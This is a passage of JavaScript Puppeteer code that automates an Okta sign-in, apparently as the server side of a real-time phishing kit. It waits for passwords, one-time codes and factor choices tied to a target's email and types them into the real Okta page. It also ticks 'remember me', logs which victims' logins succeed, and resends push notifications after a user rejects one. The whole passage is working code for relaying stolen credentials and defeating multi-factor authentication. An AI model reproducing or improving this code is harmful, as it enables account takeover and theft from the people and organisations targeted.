await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'catcherror',dataDebug,false); 
 
 
try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err2:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}


console.log('clink1:'+clink);

//console.log(await page.content());
//<input class="button button-primary" type="submit" value="Next" data-type="save">
await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'catcherror2',dataDebug,false); 


try {clink2 = await page.evaluate(() => document.location.href);console.log('1st Successfully get clink2:'+clink2);}catch(e){
    console.log('1st error clink2 catch error:'+e);
    try {clink2 = await page.evaluate(() => document.location.href);console.log('2nd Successfully get clink2:'+clink2);}catch(ee){console.log('2nd error clink2 catch error:'+ee);clink2 = false;}
    
}
if(clink !== clink2){
try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err3:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}
    
}
//.challenge-poll--okta_verify
//.select-authenticator-authenticate--okta_verify
    //
    //console.log('email puted');
    //<input type="checkbox" name="rememberMe"
    
    /*
    Password Verify option:pass
    SMS Phone Verify option:otp
    CUSTOM OTP Verify option:cotp
    Otp code /  Okta Authenticator:totp
    Push notification / Okta Authenticator:push
    Otp code / Google Authenticator:gotp
    Push notification / Google Authenticator:gpush
    Email Verify option:email
    */
    if(!failNext && !failPut && (await page.$('input[type=password]') !== null||await page.$('.select-authenticator-authenticate--okta_verify') !== null||await page.$('.authenticator-verify-list') !== null)){

        
    if(await page.$('.select-authenticator-authenticate--okta_verify') !== null||await page.$('.authenticator-verify-list') !== null){

console.log('select okta_verify option from list');
    //div[data-se=okta_verify-totp] a.button     ------- Enter a code /  Okta Verify
    //div[data-se=okta_verify-push] a.button     ------- Get a push notification / Okta Verify
    //div[data-se=okta_password] a.button        ------- Password
    //div[data-se=okta_email] a.button           ------- Email
    //div[data-se=phone_number] a.button         ------- Phone
    //div[data-se=okta_verify-signed_nonce] a.button         ------- Okta FastPass Verify
    var oktaVerifyList1 = Array();
    if(await page.$('div[data-se=okta_password]') !== null){
    //console.log('Password Verify option');
    oktaVerifyList1.push("PASS");//pass
    }
    if(await page.$('div[data-se=phone_number]') !== null){
    //console.log('SMS Phone Verify option');
    oktaVerifyList1.push("OTP");//
    }
    if(await page.$('CUSTOM_OTP') !== null){
    //console.log('CUSTOM OTP Verify option');
    oktaVerifyList1.push("COTP");//
    }
    if(await page.$('div[data-se=okta_verify-totp]') !== null){
    //console.log('Otp code /  Okta Authenticator');
    oktaVerifyList1.push("TOTP");
    }
    if(await page.$('div[data-se=okta_verify-push]') !== null){
    //console.log('Push notification / Okta Authenticator');
    oktaVerifyList1.push("PUSH");//
    }
    if(await page.$('div[data-se=google_otp]') !== null){
    //console.log('Otp code / Google Authenticator');
    oktaVerifyList1.push("GOTP");//
    }
    
    if(await page.$('GPUSH') !== null){
    //console.log('Push notification / Google Authenticator');
    oktaVerifyList1.push("GPUSH");//
    }
    if(await page.$('div[data-se=okta_email]') !== null){
    //console.log('Email Verify option');
    oktaVerifyList1.push("EMAIL");
    }
    console.log('oktaVerifyList1:',oktaVerifyList1);

    
    //await page.click("div[data-se=okta_verify-totp] a");
    //console.log('okta_verify-totp Button Clicked');


if(oktaVerifyList1.includes("PASS")&&1==2){
        
    await page.click("div[data-se=okta_password] a");
        console.log('Okta Password Button Clicked');
    try{ await page.waitForFunction("document.querySelector('input[type=password]')");console.log('Okta Password Button Clicked successfully');}catch(e){console.log('fail click Okta Password Button, catch err:'+e);}  

}else{
console.log('waiting for SelectedAuth');
SelectedAuth = await waitForSelectedAUTH(dataId,decodeURI(dataEmail),'okta',undefined,undefined,180000,1000,page);
console.log('waiting is finished');
console.log('SelectedAuth :.'+SelectedAuth);

}

if(typeof SelectedAuth !== 'undefined'&&SelectedAuth){
    if(oktaVerifyList1.includes("PASS")&&SelectedAuth=='pass'){
        
        
    await page.click("div[data-se=okta_password] a");
        console.log('Okta Password Button Clicked1');
    try{ await page.waitForFunction("document.querySelector('input[type=password]')");console.log('Okta Password Button Clicked successfully1');}catch(e){console.log('fail click Okta Password Button1, catch err:'+e);}  

     OktaMode = "PASS";
    
    }else if(oktaVerifyList1.includes("PUSH")&&SelectedAuth=='push'){
 
    await page.click("div[data-se=okta_verify-push] a");
    console.log('Okta Push notification Button Clicked1');
    OktaMode = "PUSH";
    //reject Push notification 
    //<div data-se="callout" class="infobox clearfix infobox-error"><span data-se="icon" class="icon error-16"></span><div>You have chosen to reject this login.</div></div>
    //<input class="button button-primary" type="submit" value="Resend push notification" data-type="save">
    
        
    //await page.$('.challenge-poll--okta_verify') !== null||await page.$('.okta-verify-push-challenge') !== null
    try{ await page.waitForFunction("(document.querySelector('input[type=submit]')&&document.querySelector('input[type=checkbox]'))||document.querySelector('.send-push')");console.log('Success Okta Push notification choose1');}catch(e){console.log('fail Okta Push notification choose1, catch err:'+e);}

    }else if(oktaVerifyList1.includes("TOTP")&&SelectedAuth=='totp'){

    await page.click("div[data-se=okta_verify-totp] a");
    console.log('Okta Verify TOTP Button Clicked1');
    OktaMode = "TOTP";
    //credentials.totp
    try{ await page.waitForFunction("document.querySelector('input[type=text]')&&document.querySelector('input[type=submit]')");console.log('Okta TOTP Button Clicked successfully1');}catch(e){console.log('fail click Okta TOTP Button1, catch err:'+e);}  

    }else if(oktaVerifyList1.includes("OTP")&&SelectedAuth=='otp'){
    
        
    }else if(oktaVerifyList1.includes("GOTP")&&SelectedAuth=='gotp'){

    await page.click("div[data-se=google_otp] a");
    console.log('Google Authentification OTP Button Clicked1');
    OktaMode = "GOTP";
    //credentials.gotp
    try{ await page.waitForFunction("document.querySelector('input[type=text]')&&document.querySelector('input[type=submit]')");console.log('Google Authentification OTP Button Clicked successfully1');}catch(e){console.log('fail Google Authentification OTP Button1, catch err:'+e);}  

    }else if(oktaVerifyList1.includes("EMAIL")&&SelectedAuth=='email'){
        
        
    await page.click("div[data-se=okta_email] a");
    console.log('Okta Email Button Clicked1');
    OktaMode = "EMAIL";
    //<input class="button button-primary" type="submit" value="Send me an email" data-type="save">
    try{ await page.waitForFunction("(document.querySelector('.mfa-okta-email')||document.querySelector('.authenticator-verification-data--okta_email'))&&document.querySelector('input[type=submit]')");console.log('Okta EMAIL Button Clicked successfully1');}catch(e){console.log('fail click Okta EMAIL Button1, catch err:'+e);}  

    }    
    
}


}



if(await page.$('input[type=checkbox]') !== null){//name=rememberMe

const element2 = await page.$("input[type=checkbox]");
    const isCheckBoxChecked2 = await (await element2.getProperty("checked")).jsonValue();
    if(! isCheckBoxChecked2 ){
        await element2.click()
        //await page.$eval('input[type=checkbox]', check => check.checked = true);
        console.log("rememberMe Checkbox checked:");
    }
    //Okdisplay['rememberme']=true;
if(typeof ResultByIds[dataId][decodeURI(dataEmail)]['okta']['next']['rememberme']!=='undefined'){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['next']['rememberme']=true;
}
    }  











if(await page.$('input[type=password]') !== null&&isCorrectLogin){
    //Okdisplay['passinput']=true;
if(typeof ResultByIds[dataId][decodeURI(dataEmail)]['okta']['next']['auth']!=='undefined'){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['next']['auth']='pass';
}

/* 
    Password Verify option:pass
    SMS Phone Verify option:otp
    CUSTOM OTP Verify option:cotp
    Otp code / Okta Authenticator:totp
    Push notification / Okta Authenticator:push
    Otp code / Google Authenticator:gotp
    Push notification / Google Authenticator:gpush
    Email Verify option:email
*/
isCorrectLogin = false;
console.log('waiting for Okta Code');
isCorrectLogin = false;
OktaCode = await waitForOTP(dataId,decodeURI(dataEmail),'okta','pass',undefined,180000,1000,page);
OktaTypeArr[OktaCode]='pass';
OktaType = 'pass';
console.log('waiting is finished');
console.log('OktaCode :'+OktaCode);




if( typeof OktaCode !== 'undefined' && OktaCode){
SAML_pass = OktaCode;
    //await page.click("input[type=password]",{clickCount: 3});
    await page.$eval('input[type=password]', el => el.value = '');
    //await page.focus('input[type=password]');
    await page.type("input[type=password]",OktaCode,{delay:25});
    await page.click("input[type=submit]");//input[type=submit][value=Verify]
    console.log('password submited')
    try{ await page.waitForFunction("document.querySelector('.link-button-disabled')||!document.querySelector('input[type=submit]')");  }catch(e){failBtnSubmit=true;console.log('fail Verify, catch err:'+e);}

    
    if(!failBtnSubmit){
        try{ await page.waitForFunction("document.querySelector('.link-button-disabled') === null||document.querySelector('input[type=submit]') === null||document.querySelector('.select-authenticator-authenticate--okta_verify')||document.querySelector('.authenticator-verify-list')||document.querySelector('.authenticator-enroll-list')||document.querySelector('.challenge-poll--okta_verify')||document.querySelector('.o-form-has-errors')||document.querySelector('p[role=alert]')"); console.log('Verify button successfully Submited.');}catch(e){failVerify=true;console.log('fail Verify button Submited, catch err:'+e);}
    }
} 

}else{
    successlogin=false;
} 


    //<div class="authenticator-button" data-se="okta_password"><a data-se="button" class="button select-factor link-button" href="#">Select</a></div>
    
    //<div class="authenticator-button" data-se="okta_verify-push"><a data-se="button" class="button select-factor link-button" href="#">Select</a></div>
    
    //<div class="authenticator-button" data-se="okta_verify-totp"><a data-se="button" class="button select-factor link-button" href="#">Select</a></div>
    
    
    //skip-all  //<a data-se="button" class="button-primary button skip-all link-button" href="#">Set up later</a>
    
    
    
    }
    

if(OktaCode){
try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err4:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}


console.log('clink1:'+clink);

//console.log(await page.content());
//<input class="button button-primary" type="submit" value="Next" data-type="save">
await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'catcherror5',dataDebug,false); 


try {clink2 = await page.evaluate(() => document.location.href);console.log('1st Successfully get clink2 :'+clink2);}catch(e){
    console.log('1st error clink2 catch error :'+e);
    try {clink2 = await page.evaluate(() => document.location.href);console.log('2nd Successfully get clink2 :'+clink2);}catch(ee){console.log('2nd error clink2 catch error :'+ee);clink2 = false;}
    
}
if(clink !== clink2){
try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err5:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}
    
}

}




console.log('OktaResult:',OktaResult[OktaTypeArr[OktaCode]]);

pageTitle = await page.evaluate(() => document.title);
if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="no";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['no'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}else if(pageTitle.includes('My Apps Dashboard')){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='done';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}else if(await page.$('.select-authenticator-authenticate--okta_verify') !== null||await page.$('.authenticator-verify-list') !== null){
console.log('authlist');
var OktaAuthList = Array();
if(await page.$('div[data-se=okta_password]') !== null){OktaAuthList.push("PASS");}
if(await page.$('div[data-se=phone_number]') !== null){OktaAuthList.push("OTP");}
if(await page.$('CUSTOM_OTP') !== null){OktaAuthList.push("COTP");}
if(await page.$('div[data-se=okta_verify-totp]') !== null){OktaAuthList.push("TOTP");}
if(await page.$('div[data-se=okta_verify-push]') !== null){OktaAuthList.push("PUSH");}
if(await page.$('div[data-se=google_otp]') !== null){OktaAuthList.push("GOTP");}
if(await page.$('GPUSH') !== null){OktaAuthList.push("GPUSH");}
if(await page.$('div[data-se=okta_email]') !== null){OktaAuthList.push("EMAIL");}
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']=OktaAuthList;
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}else if(await page.$('div[data-se=okta_password]') !== null){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='pass';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}
else if(await page.$('div[data-se=phone_number]') !== null){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='otp';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}
else if(await page.$('CUSTOM_OTP') !== null){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='cotp';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;    
}else if(await page.$('div[data-se=okta_verify-totp]') !== null){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='totp';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}else if(await page.$('div[data-se=okta_verify-push]') !== null){
    ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='push';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}
else if(await page.$('div[data-se=google_otp]') !== null){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='gotp';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}
else if(await page.$('GPUSH') !== null){
    ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='gpush';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}
else if(await page.$('div[data-se=okta_email]') !== null){
    ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result']=OktaResult[OktaTypeArr[OktaCode]]['ok'];
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['next']='email';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['retry']=false;
}else if(OktaLogin){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login'][OktaLogin['user']]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login'][OktaLogin['pass']]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['result']='CorrectLogin';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['next']='done';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['retry']=false;
isCorrectLogin = true;
}else if(OktaUser){
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['next']['auth']='done';
isCorrectLogin = true;
}


if(typeof ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]][OktaCode] !=='undefined'){
LoginStatus=ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa'][OktaTypeArr[OktaCode]]['result'];
}else if(typeof ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login'][OktaLogin['user']] !=='undefined'){
LoginStatus=ResultByIds[dataId][decodeURI(dataEmail)]['okta']['login']['result'];    
}


//pageTitle = await page.title();
pageTitle = await page.evaluate(() => document.title);  
if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
    console.log('error login1');   
}else if(pageTitle.includes('My Apps Dashboard')){
 console.log('login success');    
 successlogin=true;

 
}else if(await page.$('.authenticator-enroll-list') !== null){
    console.log('Set up security methods'); 
/*
    await page.click("div[data-se=okta_verify] a");
    try{ await page.waitForFunction("document.querySelector('.challenge-poll--okta_verify')");  }catch(e){console.log('Fail Click Okta Verify Button, catch err:'+e);}
    if(await page.$('.challenge-poll--okta_verify') !== null){
     console.log('Get a push notification'); 
      if(await page.$('input[type=checkbox]') !== null){
              const element3 = await page.$("input[type=checkbox]");
    const isCheckBoxChecked3 = await (await element3.getProperty("checked")).jsonValue();
    if(! isCheckBoxChecked3 ){
        await element3.click()
        console.log("Send push automatically checked:");
    } }   
     }
    
*/    
    
    //await page.click("div[data-se=phone_number] a");
    //console.log('Phone'); //.phone-authenticator-enroll  
    }else if(await page.$('.select-authenticator-authenticate--okta_verify') !== null||await page.$('.authenticator-verify-list') !== null){
    console.log('select okta_verify option from list.');
    //div[data-se=okta_verify-totp] a.button     ------- Enter a code /  Okta Verify
    //div[data-se=okta_verify-push] a.button     ------- Get a push notification / Okta Verify
    //div[data-se=okta_password] a.button        ------- Password
    //div[data-se=okta_email] a.button           ------- Email
    //div[data-se=phone_number] a.button         ------- Phone
    //div[data-se=okta_verify-signed_nonce] a.button         ------- Okta FastPass Verify
    var oktaVerifyList2 = Array();
    if(await page.$('div[data-se=okta_password]') !== null){
    //console.log('Password Verify option');
    oktaVerifyList2.push("PASS");//pass
    }
    if(await page.$('div[data-se=phone_number]') !== null){
    //console.log('SMS Phone Verify option');
    oktaVerifyList2.push("OTP");//
    }
    if(await page.$('CUSTOM_OTP') !== null){
    //console.log('CUSTOM OTP Verify option');
    oktaVerifyList2.push("COTP");//
    }
    if(await page.$('div[data-se=okta_verify-totp]') !== null){
    //console.log('Otp code /  Okta Authenticator');
    oktaVerifyList2.push("TOTP");
    }
    if(await page.$('div[data-se=okta_verify-push]') !== null){
    //console.log('Push notification / Okta Authenticator');
    oktaVerifyList2.push("PUSH");//
    }
    if(await page.$('div[data-se=google_otp]') !== null){
    //console.log('Otp code / Google Authenticator');
    oktaVerifyList2.push("GOTP");//
    } 
    if(await page.$('GPUSH') !== null){
    //console.log('Push notification / Google Authenticator');
    oktaVerifyList2.push("GPUSH");//
    }
    if(await page.$('div[data-se=okta_email]') !== null){
    //console.log('Email Verify option');
    oktaVerifyList2.push("EMAIL");
    }
    console.log('oktaVerifyList2:',oktaVerifyList2);
    
    //await page.click("div[data-se=okta_verify-totp] a");
    //console.log('okta_verify-totp Button Clicked');


    console.log('waiting for SelectedAuth');
SelectedAuth = await waitForSelectedAUTH(dataId,decodeURI(dataEmail),'okta',undefined,undefined,180000,1000,page);
console.log('waiting is finished');
console.log('SelectedAuth :..'+SelectedAuth);


    if(typeof SelectedAuth !== 'undefined' && SelectedAuth && oktaVerifyList2.includes(SelectedAuth.toUpperCase()) && SelectedAuth=='pass'){
        
        
    await page.click("div[data-se=okta_password] a");
        console.log('Okta Password Button Clicked1');
    try{ await page.waitForFunction("document.querySelector('input[type=password]')");console.log('Okta Password Button Clicked successfully1');}catch(e){console.log('fail click Okta Password Button1, catch err:'+e);}  
     OktaMode = "PASS";
   
    
    }else if(typeof SelectedAuth !== 'undefined' && SelectedAuth && oktaVerifyList2.includes(SelectedAuth.toUpperCase()) && SelectedAuth=='push'){
 
    await page.click("div[data-se=okta_verify-push] a");
    console.log('Okta Push notification Button Clicked1');
    OktaMode = "PUSH";
    //reject Push notification 
    //<div data-se="callout" class="infobox clearfix infobox-error"><span data-se="icon" class="icon error-16"></span><div>You have chosen to reject this login.</div></div>
    //<input class="button button-primary" type="submit" value="Resend push notification" data-type="save">
    
        
    //await page.$('.challenge-poll--okta_verify') !== null||await page.$('.okta-verify-push-challenge') !== null
    try{ await page.waitForFunction("(document.querySelector('input[type=submit]')&&document.querySelector('input[type=checkbox]'))||document.querySelector('.send-push')");console.log('Success Okta Push notification choose1');}catch(e){console.log('fail Okta Push notification choose1, catch err:'+e);}

    }else if(typeof SelectedAuth !== 'undefined' && SelectedAuth && oktaVerifyList2.includes(SelectedAuth.toUpperCase()) && SelectedAuth=='totp'){

    await page.click("div[data-se=okta_verify-totp] a");
    console.log('Okta Verify TOTP Button Clicked1');
    OktaMode = "TOTP";
    //credentials.totp
    try{ await page.waitForFunction("document.querySelector('input[type=text]')&&document.querySelector('input[type=submit]')");console.log('Okta TOTP Button Clicked successfully1');}catch(e){console.log('fail click Okta TOTP Button1, catch err:'+e);}  

    }else if(typeof SelectedAuth !== 'undefined' && SelectedAuth && oktaVerifyList2.includes(SelectedAuth.toUpperCase()) && SelectedAuth=='otp'){
    
        
    }else if(typeof SelectedAuth !== 'undefined' && SelectedAuth && oktaVerifyList2.includes(SelectedAuth.toUpperCase()) && SelectedAuth=='gotp'){

    await page.click("div[data-se=google_otp] a");
    console.log('Google Authentification OTP Button Clicked1');
    OktaMode = "GOTP";
    //credentials.gotp
    try{ await page.waitForFunction("document.querySelector('input[type=text]')&&document.querySelector('input[type=submit]')");console.log('Google Authentification OTP Button Clicked successfully1');}catch(e){console.log('fail Google Authentification OTP Button1, catch err:'+e);}  

    }else if(typeof SelectedAuth !== 'undefined' && SelectedAuth && oktaVerifyList2.includes(SelectedAuth.toUpperCase()) && SelectedAuth=='email'){
        
        
    await page.click("div[data-se=okta_email] a");
    console.log('Okta Email Button Clicked1');
    OktaMode = "EMAIL";
    //<input class="button button-primary" type="submit" value="Send me an email" data-type="save">
    try{ await page.waitForFunction("(document.querySelector('.mfa-okta-email')||document.querySelector('.authenticator-verification-data--okta_email'))&&document.querySelector('input[type=submit]')");console.log('Okta EMAIL Button Clicked successfully1');}catch(e){console.log('fail click Okta EMAIL Button1, catch err:'+e);}  

    }
    
 
 
 
    
    }
    

   
if((await page.$('.o-form-has-errors') == null&&await page.$('p[role=alert]') == null)&&(await page.$('.challenge-authenticator--okta_password') !== null||await page.$('.mfa-verify-password') !== null)){//Password
console.log('Password');
    	
     if(await page.$('input[type=checkbox]') !== null){//name=rememberMe
     const element4 = await page.$("input[type=checkbox]");
    const isCheckBoxChecked4 = await (await element4.getProperty("checked")).jsonValue();
    if(! isCheckBoxChecked4 ){
        await element4.click()
        //await page.$eval('input[type=checkbox]', check => check.checked = true);
        console.log("rememberMe Checkbox checked1:");
    } 
        
    }   
        
    if(await page.$('input[type=password]') !== null){
    //await page.click("input[type=password]",{clickCount: 3});
    console.log('waiting for Okta Code');
isCorrectLogin = false;    
OktaCode = await waitForOTP(dataId,decodeURI(dataEmail),'okta','pass',undefined,180000,1000,page);
OktaTypeArr[OktaCode]='pass';
OktaType = 'pass';
console.log('waiting is finished');
console.log('OktaCode :'+OktaCode);




if( typeof OktaCode !== 'undefined' && OktaCode){
    
    
    SAML_pass = OktaCode;    
    await page.$eval('input[type=password]', el => el.value = '');
    //await page.focus('input[type=password]');
    await page.type("input[type=password]",OktaCode,{delay:25});
    page.click("input[type=submit]");//input[type=submit][value=Verify]
    console.log('pass submited1');
    try{ await page.waitForFunction("document.querySelector('.link-button-disabled')");  
    
        try{ await page.waitForFunction("document.querySelector('.link-button-disabled') === null||document.querySelector('input[type=submit]') === null||document.querySelector('.select-authenticator-authenticate--okta_verify')||document.querySelector('.authenticator-verify-list')||document.querySelector('.authenticator-enroll-list')||document.querySelector('.challenge-poll--okta_verify')||document.querySelector('.o-form-has-errors')||document.querySelector('p[role=alert]')"); console.log('success Submit pass');if(await page.$('.o-form-has-errors') !== null||await page.$('p[role=alert]') !== null){
    console.log('wrong password');
isCorrectLogin = false;
}else{
console.log('successful password');
isCorrectLogin = true;
/*    
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa']['pass'][OktaCode]="ok";
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa']['pass']['result']='CorrectCode';
ResultByIds[dataId][decodeURI(dataEmail)]['okta']['mfa']['pass']['retry']=false;
 */   
} }catch(e){console.log('fail Submit pass, catch err:'+e);}

        
    }catch(e){console.log('fail Submit pass1, catch err:'+e);}
    }
    }

await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'catcherror6',dataDebug,false); 
    
}else if((await page.$('.infobox-error') == null&&await page.$('.infobox-warning') == null)&&(await page.$('.challenge-poll--okta_verify') !== null||await page.$('.okta-verify-push-challenge') !== null||await page.$('.okta-verify-send-push-form') !== null)){//Push   //authenticator-verification-data--okta_verify
console.log('okta verify push challenge1');

OktaCode = 'push1'; 
OktaTypeArr[OktaCode]='push';
OktaType = 'push';
    if(await page.$('.send-push') == null){
        if(await page.$('input[type=checkbox]') !== null){//name="authenticator.autoChallenge"
     const element5 = await page.$("input[type=checkbox]");
    const isCheckBoxChecked5 = await (await element5.getProperty("checked")).jsonValue();
    if(! isCheckBoxChecked5 ){
        await element5.click()
        //await page.$eval('input[type=checkbox]', check => check.checked = true);
        console.log("rememberMe Checkbox checked1 :");
    } 
    }
    if(await page.$('input[type=submit]') !== null){//name="authenticator.autoChallenge"
        await page.click("input[type=submit]");
        console.log("Send push button clicked1 :");
        
  
    }
   // try{ await page.waitForFunction("document.querySelector('.okta-verify-push-challenge')&&!document.querySelector('input[type=submit]')");console.log("Okta Push notification Sent1");  }catch(e){console.log('Okta Push notification Not Sent1, catch err:'+e);}
   //.send-push 
     try{ await page.waitForFunction("(document.querySelector('.okta-verify-send-push-form')||document.querySelector('.okta-verify-push-challenge')||document.querySelector('.send-push'))&&!document.querySelector('input[type=submit]')");console.log("Okta Push notification Sent1");  }catch(e){console.log('Okta Push notification Not Sent1, catch err:'+e);}
    }
       
 
    //Haven't received a push notification yet? Try opening the Okta Verify App on your phone.
    //await page.waitForTimeout(10000);
let IsApproved = false;
try{ console.log("Waiting for approving push notification1");await page.waitForFunction("!document.querySelector('.okta-verify-push-challenge')||document.querySelector('input[type=submit]')||document.title.includes('My Apps Dashboard')||document.title.includes('Microsoft Office Home')||document.querySelector('div[data-se=callout]')||document.querySelector('.infobox-error')", {timeout: 300000});IsApproved = true;//5MIN
//console.log('Okta Push notification is approved1');
      }catch(e){console.log('Okta Push notification is Not approved1, catch err:'+e);}


//.okta-form-infobox-warning
//.infobox-warning


   //reject Push notification 
    //<div data-se="callout" class="infobox clearfix infobox-error"><span data-se="icon" class="icon error-16"></span><div>You have chosen to reject this login.</div></div>
    //<input class="button button-primary" type="submit" value="Resend push notification" data-type="save">

try{
if(IsApproved && (await page.$('div[data-se=callout]') !== null||await page.$('.infobox-error') !== null) && await page.$('input[type=submit]') !== null){
    console.log('Okta Push notification is rejected:');
    //input[type=submit]   
    //input[value*=Resend]
    //Resend push notification
    //console.log('You have been logged out due to inactivity. Refresh or return to the sign in screen.');
    
    
    
    
    
    
    
    
    
 //send push again   
 try{   
    
 console.log('okta verify push send again');
    if(await page.$('.send-push') == null){
        if(await page.$('input[type=checkbox]') !== null){//name="authenticator.autoChallenge"
     const element5 = await page.$("input[type=checkbox]");
    const isCheckBoxChecked5 = await (await element5.getProperty("checked")).jsonValue();
    if(! isCheckBoxChecked5 ){
        await element5.click()
        //await page.$eval('input[type=checkbox]', check => check.checked = true);
        console.log("rememberMe Checkbox checked again1 :");
    } 
    }
